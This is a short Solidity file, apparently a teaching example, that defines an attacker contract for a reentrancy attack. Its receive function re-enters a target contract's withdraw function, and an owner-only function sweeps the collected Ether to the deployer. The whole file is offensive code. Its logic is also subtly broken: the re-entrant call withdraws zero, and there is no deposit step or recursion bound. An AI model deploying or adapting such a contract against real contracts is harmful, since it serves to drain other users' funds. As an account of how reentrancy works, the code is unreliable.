// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface VulnerableContract {
    function withdraw(uint _amount) external;
}

contract AttackerContract {

    VulnerableContract public vulnerableContract;
    address public owner;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    // Function to initiate the attack
    function initiateAttack(uint _amount) external {
        // Trigger the vulnerable contract's withdraw function
        vulnerableContract.withdraw(_amount);
    }

    // Receive function to receive Ether sent during the reentrancy attack
    receive() external payable {
        // If you want, you can perform additional actions here
        // This is where the reentrancy attack would take place
        // For simplicity, we won't do any additional actions in this example
        vulnerableContract.withdraw(0); // Call the vulnerable contract again during the attack
    }

    // Function to withdraw funds from this contract
    function withdraw() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}

